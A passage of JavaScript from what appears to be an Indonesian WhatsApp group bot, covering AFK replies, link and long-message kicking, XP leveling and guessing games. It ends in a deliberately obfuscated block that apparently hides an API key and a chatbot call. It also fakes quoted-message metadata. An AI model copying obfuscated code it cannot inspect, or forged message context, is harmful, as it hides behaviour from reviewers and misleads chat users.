        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
    if (isGroup && !mek.key.fromMe && isAntiLink && !isGroupAdmins && !isOwner && !isCreator && isBotGroupAdmins){
            if (chatxs.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply2(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
     if (isGroup && isAntivirtex && !mek.key.fromMe && !isOwner) {
      if (budy.length > 1000) {
        if (isGroupAdmins) return reply2("admin bebas");
        reply2("「 A N T I V I R T E X  D E T E C T E D 」 \n\nMaaf Kamu Akan Dikick");
        alpha.groupRemove(from, [sender]);
      }
    }
    if (isGroup && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								await alpha.sendMessage(from, `* -----「 LEVEL UP 」-----*\n\n📛 *User :* ${pushname}\n🆔 *Nomer :* @${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* ${getBalance(sender, balance)}\n👛 *Dompet :* ${checkATMuser(sender)}\n✴️ *Role :* ${role}\n\nCongrats 🎉`,text, {quoted: mek, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
								}
							} catch (err) {
								console.error(err)
							}
						}
    alpha.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
            fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     alpha.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync(`./image/${thumbnail}`), sendEphemeral: true, contextInfo:{mentionedJid:alpha.parseMention(ckck)}})
                }}}}})

        if (isGroup && !mek.key.fromMe) {
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        alpha.sendMessage(from, `Jangan tag, dia sedang afk\n\n*Reason :* ${getReason}\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu\n`,text, {quoted:mek})
                       // alpha.sendMessage(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid: alpha.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
                    alpha.sendMessage(from, `@${sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, text, {contextInfo:{mentionedJid:[sender]}})
                }
            }

            function addMetadata(packname, author) {
    if (!packname) packname = `${botname}`; if (!author) author = ` ${peknem}`;
    author = author.replace(/[^a-zA-Z0-9]/g, '');
    //let name = `data`

    if (fs.existsSync(`./sticker/data.exif`)) {
        return `./sticker/data.exif`
    }
    const json = {
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
    }

    const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
    const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

    let len = JSON.stringify(json).length
    let last

    if (len > 256) {
        len = len - 256
        bytes.unshift(0x01)
    } else {
        bytes.unshift(0x00)
    }

    if (len < 16) {
        last = len.toString(16)
        last = "0" + len
    } else {
        last = len.toString(16)
    }

    const buf2 = Buffer.from(last, "hex")
    const buf3 = Buffer.from(bytes)
    const buf4 = Buffer.from(JSON.stringify(json))

    const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

    fs.writeFile(`./sticker/data.exif`, buffer, (err) => {
        return `./sticker/data.exif`
    }
    )
}
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                const ini_gcchat = `${giid.length}`
				const uptime = process.uptime()
			    const tekss = `${kyun(uptime)}`
			    const ini_totalchat = `${totalchat.length - giid.lenght}`

const replyy = (teks) => {
			alpha.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
/////
 for (let zeeone of setiker){
	if (budy === zeeone){
		result = fs.readFileSync(`./media/sticker/${zeeone}.webp`)
		alpha.sendMessage(from, result,sticker, {quoted : ftroli})
		}
}
for (let zeeonee of audionye){
	if (budy === zeeonee){
		result = fs.readFileSync(`./media/audio/${zeeonee}.mp3`)
		alpha.sendMessage(from, result, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true, quoted : ftroli})
		}
}
for (let zeeoneee of imagenye){
	if (budy === zeeoneee){
		result = fs.readFileSync(`./media/foto/${zeeoneee}.jpg`)
		alpha.sendMessage(from, result,image, {quoted : ftroli})
		}
}
for (let zeeonew of videonye){
	if (budy === zeeonew){
		result = fs.readFileSync(`./media/video/${zeeonew}.mp4`)
		alpha.sendMessage(from, result,video, {mimetype: 'video/mp4', duration: 359996400, quoted: ftroli})
		}
}  
for (let i = 0; i < filter.length ; i++) {
      if (budy == filter[i].Filter) {
      alpha.sendMessage(from, filter[i].Jawaban, text, {quoted: mek})
      }
      }  
      const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      alpha.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options);
    };

// TEBAK GAMBAR
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tebakgambar`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
 // SIAPA AKU
if (siapakahaku.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = siapakahaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete siapakahaku[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `siapakahaku`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/siapakahaku.json", JSON.stringify(siapakahaku))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEBAK KALIMAT
if (tebakkalimat.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tebakkalimat[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                     delete tebakkalimat[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tebakkalimat`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/tebakkalimat.json", JSON.stringify(tebakkalimat))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEBAK KALIMAT
if (tebakkata.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tebakkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete tebakkata[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tebakkata`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEBAK LIRIK
if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete tebaklirik[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tebaklirik`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEKA TEKI
if (tekateki.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tekateki[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete tekateki[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tekateki`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/tekateki.json", JSON.stringify(tekateki))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// SUSUN KATA
if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete susunkata[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `susunkata`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// CAK LONTONG
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete caklontong[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `caklontong`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// FAMILY 100
if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = family[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    delete family[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `family100`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEBAK ANIME
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                     delete tebakanime[sender.split('@')[0]]
                    sendButMessage(from, "Selamat🥳 Jawaban kamu benar!\n\n🎁 + Exp 500\n💰 + Balance $10", `© ${botname} | ${ownername}`, [{"buttonId": `tebakanime`,"buttonText": {"displayText": "Main Lagi"},"type": "RESPONSE"}], {quoted : mek})
                    addBalance(sender, 10, balance)
                    addLevelingXp(sender, 500)
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
            if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in Private', 'args :', color(args.length))
						return reply2('Don`t Spam, 3 seconds per command')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
						return reply2('Don`t Spam, 3 seconds per command')
					}
           ////   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
		if (isCmd && isGroup){
		console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
		addBalance(sender, randomNomor(20), balance)
			}	
			(function(_0x8d5137,_0x459c73){function _0x557cc0(_0x3885f1,_0x83a6fa,_0x1aba4f,_0xf7b9b4){return _0x4ca6(_0x83a6fa- -0x1d0,_0xf7b9b4);}const _0x3e29da=_0x8d5137();function _0x4f2c26(_0x3151bd,_0x49926a,_0x1edd1f,_0x34804b){return _0x4ca6(_0x3151bd-0xd5,_0x34804b);}while(!![]){try{const _0x5313f6=-parseInt(_0x4f2c26(0x787,0xac1,0x85a,0x949))/(0xb0d+0x1cf9*0x1+-0x5*0x801)+-parseInt(_0x557cc0(0x6a1,0x3bf,0x637,0x5d5))/(-0xc6f+0x1b*0x143+-0x15a0)+-parseInt(_0x557cc0(0x35e,0x98,0x205,0x152))/(-0x34c+-0x173*-0xb+0x21*-0x62)*(parseInt(_0x557cc0(0x568,0x27d,0x167,0x577))/(-0x234a*-0x1+0x1bf*0xb+0x367b*-0x1))+-parseInt(_0x557cc0(0x111,0x444,0x843,0x13a))/(0x10b1*-0x2+-0xc*-0x303+-0x1*0x2bd)*(-parseInt(_0x4f2c26(0x9b6,0xb39,0x557,0xac1))/(0x2*0x8f3+0x1e39*-0x1+0xc59))+parseInt(_0x4f2c26(0x260,-0x19c,0xea,0x123))/(0xd*0xbf+-0x398+-0x614)*(parseInt(_0x557cc0(0x5b8,0x3c7,0x35d,0x368))/(-0x1262+0xe52+-0x8*-0x83))+-parseInt(_0x4f2c26(0x3d3,0x8c7,0x383,0x550))/(0x20*0xea+0x49*-0x6b+0x14c*0x1)+parseInt(_0x557cc0(0x58a,0x8a0,0x9c6,0x521))/(0xbe1*0x2+-0x7ff+0x1*-0xfb9)*(parseInt(_0x557cc0(0x84e,0x69e,0x79f,0x64e))/(0xf99+-0xb3e*-0x3+-0x18a4*0x2));if(_0x5313f6===_0x459c73)break;else _0x3e29da['push'](_0x3e29da['shift']());}catch(_0x468993){_0x3e29da['push'](_0x3e29da['shift']());}}}(_0x5499,0x1*0xfbb3d+0x2d6*-0x2+-0x6ed24));if(!mek[_0x15af3d(0x53a,0x80a,0x79,0x619)][_0x15af3d(0x2d8,0x32d,-0x182,0x611)]&&!isOwner&&!isCreator&&banChats===!![])return;const alphaapi='https://ap'+_0x134458(0x45c,0x658,0x5b8,0x5f9)+_0x134458(0x927,0xcf3,0x770,0xe1c)+_0x15af3d(0x480,0x507,-0x1e,0x37),alphakey=_0x15af3d(0x49c,0x86f,0x54d,0x34a),reply=_0x544658=>{function _0x102a7f(_0x1539d1,_0x330977,_0x5cf9c8,_0x387f91){return _0x134458(_0x387f91-0x309,_0x330977-0x14f,_0x330977,_0x387f91-0x5c);}function _0x1d5665(_0x2cbe29,_0x41eb63,_0x516cdb,_0x3593c8){return _0x15af3d(_0x3593c8-0x4c,_0x41eb63-0x1ce,_0x41eb63,_0x3593c8-0xdb);}alpha[_0x102a7f(0xcda,0xf25,0xf8c,0xc8b)+'e'](from,_0x544658,text,{'quoted':mek,'contextInfo':{'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':'PHOTO','thumbnailUrl':'','thumbnail':fs[_0x1d5665(0x889,0x861,0x1df,0x6c5)+'nc'](_0x1d5665(0x1d5,0x90e,0x8d6,0x434)+thumbnail),'sourceUrl':''+apiku}}});};if(!isGroup&&!isCmd&&!command&&!mek[_0x134458(0x3e7,0x79,0x409,0x279)][_0x134458(0x185,0x50,0x540,0x2f5)]&&!autorespon){simi=await fetchJson(_0x15af3d(0x4f4,0xe6,0x386,0x3d1)+_0x15af3d(0x982,0x50e,0x9e4,0xa31)+'net/v2/?lc'+_0x134458(0x287,0x2f1,0x6b1,0xd0)+'lse&text='+cmd),sami=simi[_0x15af3d(0x9c9,0x8d5,0xeb3,0xbcd)];const _0x402085={};_0x402085[_0x15af3d(0x8f1,0x5ae,0x757,0x593)+_0x15af3d(0xc04,0xc9c,0xe4d,0x869)]=0x1fc,_0x402085[_0x15af3d(0x588,0x9e8,0x677,0x4f8)+'d']=!![],alpha[_0x15af3d(0xad5,0xd41,0xdc1,0xe73)+'e'](from,'_'+sami+'_',text,{'thumbnail':fs[_0x134458(0x526,0x704,0x9ea,0x8c8)+'nc'](_0x134458(0x76f,0xc4c,0x9ed,0x51c)+thumbnail),'sendEphemeral':!![],'quoted':mek,'contextInfo':_0x402085});}const sendButDoc=(_0x16a8b7,_0xea0e78,_0x44063c,_0x4f668d,_0x5ec705,_0x3b4f89)=>{const _0x388ffb={};_0x388ffb[_0x1774b6(0x44d,0x707,0x33f,0x4e6)]=_0x1774b6(0xd3c,0xd40,0x6dd,0x8eb)+_0x1774b6(0x519,0x475,0x58f,0x145)+_0x1774b6(0x743,-0xf3,-0x59,0x3ae),_0x388ffb[_0x1e4bd4(0xcbd,0xd80,0xb6c,0x1113)]='https://yo'+'utu.be/BjT'+_0x1774b6(0x2dd,0x6ac,-0x115,0x307),_0x388ffb[_0x1774b6(0x9d,0x428,-0x68,0x191)]=_0x1e4bd4(0x1187,0xece,0xb22,0x12c2)+_0x1e4bd4(0x47d,0x85d,0x4a9,0x3a1)+_0x1e4bd4(0x983,0xa91,0xaf9,0x819),_0x388ffb[_0x1e4bd4(0xc79,0xaf1,0x628,0x8f2)]='https://yo'+_0x1e4bd4(0xb4f,0x89c,0x7f0,0xd81)+_0x1774b6(0x2d7,0x482,0x1cc,0x269),_0x388ffb[_0x1774b6(0x1f4,0x4e1,0x234,0xa9)]=function(_0x6d818d,_0x42c480){return _0x6d818d*_0x42c480;},_0x388ffb[_0x1e4bd4(0x489,0x8e6,0xa4e,0x433)]=_0x1774b6(0x4d1,-0x162,-0x17a,0x345)+_0x1774b6(0xff,-0x1f5,0x31c,0x1a1),_0x388ffb[_0x1774b6(0x669,0x928,0x305,0x5c9)]=_0x1e4bd4(0xcfa,0x928,0xd8d,0xd3b)+_0x1774b6(0x3fc,0x1f7,0x7cc,0x364)+_0x1e4bd4(0x45b,0x595,0x3b2,0x471)+_0x1774b6(0x736,0x6cb,0xa4e,0x91e)+_0x1e4bd4(0x661,0x977,0x844,0xcef)+_0x1774b6(0x1ff,0x579,0x828,0x4a3)+_0x1774b6(0x2d2,0x66,0x13c,0x1d)+'t',_0x388ffb[_0x1774b6(0x514,0xd30,0x604,0x8c3)]='applicatio'+_0x1774b6(0x73,0x502,0x587,0x364)+_0x1e4bd4(0x937,0x595,0x726,0x715)+_0x1774b6(0x840,0x82e,0xba5,0x91e)+_0x1774b6(0x430,0x627,0x3dd,0x8cb)+_0x1e4bd4(0x7db,0x695,0x5f9,0x6ea)+'.presentat'+_0x1774b6(0x244,-0x14d,0xbc,-0x7a),_0x388ffb[_0x1774b6(-0x240,-0x1e,0xf5,0x18f)]='Command',_0x388ffb['CZDll']=_0x1774b6(-0xb2,0x36,0x2f9,0x43a)+'u',_0x388ffb[_0x1774b6(0x1bf,0x2bf,0x263,0xe5)]=_0x1e4bd4(0x449,0x6a2,0xb45,0x9cb),_0x388ffb[_0x1e4bd4(0x7d5,0x78e,0x899,0xc21)]='🙍‍♂️\x20Owner',_0x388ffb[_0x1774b6(0x8e0,0x503,0x73b,0x8f7)]=_0x1e4bd4(0x274,0x612,0x6c1,0x1d1)+_0x1e4bd4(0x5a7,0x569,0x342,0x2cf),_0x388ffb['tTvqP']=_0x1e4bd4(0xcae,0xdff,0xf2a,0xceb)+_0x1e4bd4(0x7ff,0xc0f,0xdee,0x1017)+'.net/d/f/A'+_0x1e4bd4(0x213,0x604,0x88a,0x2b6)+_0x1e4bd4(0x8ad,0x9fc,0x60e,0xd08)+_0x1e4bd4(0x996,0x935,0x923,0x9b9)+_0x1774b6(0x1f0,0x69,0x47d,0x397)+_0x1774b6(0x82f,0x94c,0x5b2,0x62a),_0x388ffb['ZdLhB']='kXrt+8eqBg'+_0x1e4bd4(0xd4b,0xa89,0x701,0x6ca)+_0x1e4bd4(0xadc,0x77a,0x721,0x9c8)+_0x1774b6(0x1bb,0x220,0x262,0x4fc)+_0x1774b6(0x3bb,0x482,-0x314,0x1cb),_0x388ffb[_0x1774b6(0xc71,0x70b,0x681,0x8d7)]=_0x1e4bd4(0x71c,0xb35,0xa66,0xf59)+_0x1774b6(0xc67,0x873,0x68c,0x87d),_0x388ffb[_0x1774b6(0x3c3,0x2e3,0x259,0x3cf)]=_0x1e4bd4(0x3dd,0x67f,0x864,0x1d6)+_0x1774b6(0x920,0x998,0xac9,0x801)+'bA1B2pJ18r'+'KZqeL7byF+'+_0x1774b6(0x57c,0xa73,0x3b6,0x7cd);const _0x102df6=_0x388ffb,_0x211d4d=[_0x102df6[_0x1774b6(0x1ee,0x74a,0x5e2,0x4e6)],_0x102df6[_0x1e4bd4(0x122d,0xd80,0xb28,0xfe9)],_0x102df6[_0x1e4bd4(0x45b,0x774,0xc2c,0x9fb)],_0x102df6[_0x1774b6(0x1e1,0x913,0x5e0,0x50e)]],_0xc09ea2=_0x211d4d[Math[_0x1774b6(0x507,0x566,0x392,0x788)](_0x102df6[_0x1774b6(0x128,-0x1bd,0x4bd,0xa9)](Math[_0x1774b6(-0x9,0x3f,0x5fc,0x342)](),_0x211d4d['length']))],_0x4eb8c1=[_0x102df6[_0x1774b6(-0x7a,-0x11d,0x77d,0x303)],_0x1774b6(0x7b6,0x665,0x62e,0x345)+_0x1774b6(0x5f2,0x72a,0x16c,0x364)+'xmlformats'+'-officedoc'+'ument.spre'+_0x1774b6(0x15b,0x182,-0x137,0x141)+_0x1774b6(0x6b3,0x32a,0x4de,0x2f4),_0x102df6[_0x1e4bd4(0x109e,0xbac,0x1013,0x9c4)],_0x102df6['HNDqI']],_0x4e0e70=_0x4eb8c1[Math['floor'](_0x102df6['HtmeL'](Math[_0x1774b6(0x300,0x7b3,0x53e,0x342)](),_0x4eb8c1[_0x1e4bd4(0xcee,0xb4d,0xeec,0x870)]))],_0x54f2c5={};_0x54f2c5[_0x1774b6(0x65e,0x8b0,0x94a,0x8df)]=_0x102df6[_0x1e4bd4(0x764,0x772,0x969,0xa57)],_0x54f2c5[_0x1e4bd4(0xa38,0x836,0xa79,0x8f8)]={},_0x54f2c5[_0x1e4bd4(0x981,0xce1,0xeba,0xecb)]=0x1,_0x54f2c5[_0x1e4bd4(0xa38,0x836,0xa79,0x8f8)]['displayTex'+'t']=_0x102df6[_0x1e4bd4(0x1167,0xcb6,0x7d4,0x863)];const _0xa7ff3d={};_0xa7ff3d[_0x1e4bd4(0xeae,0xec2,0xccf,0xea4)]=_0x102df6[_0x1774b6(-0xec,-0x33,0x121,0xe5)],_0xa7ff3d[_0x1e4bd4(0xc4c,0x836,0x5ab,0x4dd)]={},_0xa7ff3d[_0x1774b6(0x230,0xbe9,0x637,0x6fe)]=0x1,_0xa7ff3d[_0x1e4bd4(0xc4c,0x836,0x5ab,0x4dd)]['displayTex'+'t']=_0x102df6[_0x1e4bd4(0x393,0x78e,0x67a,0x4be)];const _0x4927a0={};_0x4927a0['displayTex'+'t']=_0x102df6['VbqtV'];const _0x43d712={};_0x43d712['buttonId']=_0x1774b6(0x422,-0x315,-0x20d,0x103),_0x43d712['buttonText']=_0x4927a0,_0x43d712['type']=0x1;const _0x2ac7fc=[_0x54f2c5,_0xa7ff3d,_0x43d712],_0x594f77={};_0x594f77[_0x1e4bd4(0xb61,0x6e9,0x954,0x2c8)]=_0x102df6['tTvqP'],_0x594f77[_0x1774b6(0xa9b,0x49c,0xd26,0x870)]=_0x4e0e70,_0x594f77[_0x1774b6(-0x3c0,-0x224,0xb,0x1)]=_0x102df6[_0x1774b6(0x823,0x4d5,0x2be,0x34b)],_0x594f77[_0x1e4bd4(0x82e,0x994,0x4a5,0xb36)]=_0x102df6[_0x1774b6(0x763,0xc59,0xbf5,0x8d7)],_0x594f77[_0x1e4bd4(0x2f2,0x594,0xae,0x302)]=0x3e7,_0x594f77['mediaKey']=_0x1e4bd4(0x76d,0x938,0xcf5,0x95c)+'NkBAVg8GMe'+_0x1e4bd4(0xc41,0x89f,0x78e,0xb5c)+_0x1e4bd4(0x3a7,0x59a,0x2a2,0x5be)+'bG0=',_0x594f77[_0x1774b6(-0x1c2,0x46c,-0xf8,0xf1)]=botname+'\x20|\x20'+ownername,_0x594f77[_0x1774b6(0x42c,-0x15a,-0x2d8,0xa3)+'256']=_0x102df6[_0x1e4bd4(0x6e9,0x9b2,0x8cf,0x96f)],_0x594f77[_0x1e4bd4(0x30a,0x53c,0x151,0x6a9)+_0x1774b6(0x9d1,0x702,0x6aa,0x6cb)]=pp_bot2;const _0x391f7d={};function _0x1774b6(_0x2ec003,_0x55dde4,_0x24b380,_0x888f29){return _0x15af3d(_0x888f29- -0x354,_0x55dde4-0x178,_0x2ec003,_0x888f29-0x110);}_0x391f7d[_0x1e4bd4(0xb4e,0xbd9,0xd7d,0x9c0)+'t']=_0xea0e78,_0x391f7d['footerText']=_0x44063c,_0x391f7d[_0x1774b6(-0x121,0x4ed,-0x170,0x120)]=_0x2ac7fc,_0x391f7d[_0x1774b6(0x64,0x545,0x5aa,0x23b)]=_0x1774b6(0x2a9,0x484,0xb0f,0x74c),_0x391f7d[_0x1774b6(0x1ac,0x4de,0x125,0x121)+'ssage']=_0x594f77;const _0x4a6bdd=_0x391f7d,_0x30e5c9={};function _0x1e4bd4(_0x578c2c,_0x5e5e68,_0x271cfb,_0x479836){return 